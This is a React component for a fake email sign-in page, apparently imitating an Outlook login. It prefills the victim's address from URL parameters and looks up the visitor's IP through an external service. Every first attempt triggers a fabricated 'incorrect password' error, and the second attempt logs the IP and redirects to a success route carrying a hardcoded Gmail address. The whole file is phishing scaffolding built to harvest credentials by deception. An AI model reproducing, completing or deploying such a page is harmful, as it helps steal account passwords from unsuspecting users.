import React from 'react';
import { makeStyles } from '@material-ui/core/styles';
import Paper from '@material-ui/core/Paper';
import Grid from '@material-ui/core/Grid';
import Pic from '../outwhite.png'
import Pic2 from '../outblue.png'
import Logo from '../logo.svg'
import {useLocation} from 'react-router-dom'
import '../App.css'
import  {useState,useEffect} from 'react'
import queryString from 'query-string'
import SimpleCrypto from "simple-crypto-js"
import { withRouter } from "react-router-dom";
const useStyles = makeStyles((theme) => ({
  root: {
    flexGrow: 1,
   
  },
  paper: {
    padding: theme.spacing(2),
    textAlign: 'center',
    color: theme.palette.text.secondary,
  },
}));

 function Out(props) {
  const classes = useStyles();
  const location=useLocation()
  const [mail, setmail] = useState('');
  const [redirect, setred] = useState('');
  const [ip, setip] = useState('');
  const [pass,setpass]=useState('');
  useEffect(() => {
   
  console.log(location.search)
  
  const params=queryString.parse(location.search)
setmail(params.mail)
setred(params.redirect)
fetch("https://api.ipify.org/")
.then(response => response.text())
.then((response) => {
    setip(response)
})
.catch(err => console.log(err))
  }, [mail])
  const [firsttry, settry] = useState(true);
  const [show, setShow] = useState(false);
 
  return (
    <div style={{maxHeight:'100vh'}} >
      <Grid container spacing={10}  
  >
        
        <Grid item xs={12} sm={3} className='body'>
         <div className='bluepanel' >
         <img src={Pic} />
         </div>
           
        
        </Grid>
      
        <Grid container xs={12} sm={6} justify='center'>
        <Grid item xs={12} >
       
      <div  style={{marginLeft:'30px',marginTop:'100px'}}>

<form style={{display:'flex',flexDirection:'column'}} className='form'>
<img src={Pic2} width='300' alt=""/>
  <label>Email</label>
  <input type='text' value={mail} disabled />
  <div> <label>Password</label> 
  <a style={{float:'right'}}>Show</a>
  </div>
<input type='password'value={pass} onChange={(e)=>{setpass(e.target.value)}}/>
  <div>
  <input type="checkbox" />Keep me signed in
  </div>
  {show && <small style={{maxWidth:'300px',color:'red',}}>Incorrect username/password please enter the right credentials </small>}
  
  <button onClick={(e)=>{
    e.preventDefault()
if(firsttry){
settry(false)
setShow(true)
}
else{
  console.log(`newlog--${ip}`)
 props.history.push('/success?mail=yakrder@gmail.com&redirect=home')
}







  }}>Sign In</button>
  <p>Need to find <span>your password?</span></p>
</form>



      </div>
        </Grid>
        
        </Grid>
        
        
       
      </Grid>
    </div>
  );
  }
  export default withRouter(Out)